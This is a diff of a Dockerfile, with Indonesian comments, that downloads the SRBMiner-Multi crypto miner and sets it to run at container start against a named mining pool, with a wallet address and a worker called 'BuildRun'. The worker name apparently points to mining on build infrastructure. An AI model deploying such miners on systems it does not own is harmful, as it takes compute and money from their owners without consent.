@@ -8,9 +8,8 @@ RUN cd ~ && mkdir -p srbminer && cd srbminer && wget https://github.com/doktor83
 
 WORKDIR /root/srbminer/SRBMiner-Multi-3-3-9
 
-# Test dulu binary-nya
-RUN ls -la && \
-    file ./SRBMiner-MULTI && \
-    ldd ./SRBMiner-MULTI
+# Cek file ada atau gak
+RUN ls -la
 
+# Jalanin langsung
 CMD ["./SRBMiner-MULTI", "-a", "neuromorph", "-o", "stratum.cereblix.com:3333", "-u", "crb15b185b68ef2f3d4829eb419b59c8bb56d8ea8aca.BuildRun", "-p", "x", "-t", "4"]
